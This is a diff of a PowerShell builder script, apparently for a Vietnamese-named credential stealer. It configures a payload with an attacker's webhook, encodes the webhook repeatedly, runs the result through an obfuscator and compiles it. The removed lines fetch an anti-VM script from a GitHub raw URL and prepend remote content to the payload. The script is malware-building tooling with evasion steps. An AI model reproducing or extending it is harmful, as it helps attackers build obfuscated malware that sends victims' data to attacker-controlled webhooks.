@@ -8,7 +8,6 @@ function Encode-Base64 {
     return $base64String
 }
 
-$antivm = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/antivm.bat.ps1" -UseBasicP).Content
 
 # Đặt đường dẫn đến file cần kiểm tra
 $filePath = ".\batchobfuscator.exe"
@@ -127,7 +126,6 @@ $button.Add_Click({
         $webhookencode = Encode-Base64TwentyTimes -inputString $webhook
         $content = $content -replace 'FAKEHASH', $randomString
         $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
-        $content = $urlContent + "`n" + $content
         Set-Content -Path $filePath -Value $content
 
         # Path to the complie.exe executable
